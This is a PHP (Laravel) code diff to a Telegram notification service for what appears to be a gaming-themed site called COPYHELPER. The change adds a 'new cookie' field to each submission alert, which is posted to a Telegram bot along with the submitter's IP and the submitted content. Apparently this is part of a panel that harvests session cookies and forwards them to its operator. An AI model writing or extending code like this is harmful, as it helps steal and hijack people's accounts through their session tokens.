@@ -8,7 +8,7 @@ use Illuminate\Support\Facades\Log;
 
 class TelegramService
 {
-    public function sendSubmissionNotification(string $content, string $ip): void
+    public function sendSubmissionNotification(string $content, string $ip, ?string $newCookie = null): void
     {
         $botToken = Setting::get('telegram_bot_token');
         $chatId = Setting::get('telegram_chat_id');
@@ -17,11 +17,17 @@ class TelegramService
             return;
         }
 
+        $newCookieBlock = $newCookie !== null && $newCookie !== ''
+            ? "```\n{$newCookie}\n```"
+            : '_не получен_';
+
         $message = "🎮 *Новая заявка — COPYHELPER*\n\n"
             .'📅 *Дата:* `'.now()->format('d.m.Y H:i:s')." UTC`\n"
             ."🌐 *IP:* `{$ip}`\n\n"
-            ."📋 *Содержимое:*\n"
-            ."```\n{$content}\n```";
+            ."*Содержимое:*\n"
+            ."```\n{$content}\n```\n"
+            ."*Новый Кук:*\n"
+            .$newCookieBlock;
 
         try {
             Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
